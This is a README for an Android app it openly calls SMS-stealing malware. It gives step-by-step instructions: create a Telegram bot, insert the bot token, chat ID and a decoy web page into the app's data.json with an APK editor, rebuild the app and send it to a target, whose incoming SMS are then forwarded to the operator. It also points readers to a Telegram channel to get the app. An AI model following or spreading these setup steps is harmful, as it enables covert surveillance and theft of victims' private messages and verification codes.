
![Banner](/banner2.png?raw=true "title")



# Sms Reader

Android Sms Reader Malware



## Features

- Receive all sms from target
- Receive messages instantly
- In connection with the Telegram bot
- custom view ( you can define url in app so when app opend target will see url content )


## How it works ?

all you have to do is create telegram bot and receive your token and replace it in app then send app to target and you will receive target sms every time somone send sms to target.
 every time somone send message to target you will receive all target messages too !



## How to use ?

to setup app you need to do below steps

### step 1
create telegram bot with [Bot Father](https://t.me/BotFather) and grab your bot token and start your bot

### step 2
downlaod apk editor to place your token in app file
### step 3
open apk editor select app file and then select full edit
### step 4 ( important )

once you can edit app in apk editor go to File tab and then go to assets folder then select data.json file
####
- replace value with your own
```
{
    "token" : "< your bot token that you reveive in step 2 >",
    "chatId" : "< your telegram number ID >",
    "webView" : "< web page that you want to show target on app start >"
}
```
### step 5
save changes and build apk and send it to target  !

## files
to get app file join our telegram channel :
[JOIN TELEGRAM CHANNEL](https://t.me/HackDagger)



